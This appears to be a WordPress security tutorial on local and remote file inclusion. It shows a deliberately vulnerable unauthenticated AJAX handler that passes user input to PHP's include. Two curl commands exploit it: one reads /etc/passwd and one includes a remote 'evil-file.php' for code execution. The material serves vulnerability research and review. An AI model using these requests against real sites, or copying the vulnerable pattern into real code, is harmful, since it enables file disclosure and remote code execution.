## Introduction

This article covers cases of possible LFI on WordPress. This includes improper file inclusion inside of the plugin/theme which can be used to gain RCE on the server.

## Useful Functions

Several functions could be useful to identify a possible LFI vulnerability:

- [`include`](https://www.php.net/manual/en/function.include.php)
- [`include_once`](https://www.php.net/manual/en/function.include-once.php)
- [`require`](https://www.php.net/manual/en/function.require.php)
- [`require_once`](https://www.php.net/manual/en/function.require-once.php)

## Example Cases

Below is an example of vulnerable code:

```php
add_action("wp_ajax_nopriv_render_lesson", "render_lesson_template");

function render_lesson_template(){
    $template_path      = urldecode( $_GET['template_path'] ?? '' );

    // For custom template return all list of lessons
    include $template_path;
    die();
}
```

To exploit this, any unauthenticated user just needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint specifying the needed parameter to trigger the `include` function.

```bash
curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=render_lesson&template_path=/etc/passwd
```

## Remote File Inclusion

If both the PHP options `allow_url_fopen` and `allow_url_include` are turned on in the PHP configuration, a remote file inclusion is possible which allows an even easier access to executing arbitrary PHP code in the server. It allows a malicious user to add the remote PHP file to be executed leading to code execution unlike LFI where a local file needs to be available.

## Example Cases

Similar to the above case, below is an example vulnerable scenario if the mentioned options are enabled in the PHP configuration:

```php
add_action("wp_ajax_nopriv_render_lesson", "render_lesson_template");

function render_lesson_template(){
    $template_path      = urldecode( $_GET['template_path'] ?? '' );

    // For custom template return all list of lessons
    include $template_path;
    die();
}
```

To exploit this, any unauthenticated user just needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint specifying the external link to the PHP code to trigger the `include` function.

```bash
curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=render_lesson&template_path=https://example.com/evil-file.php
```
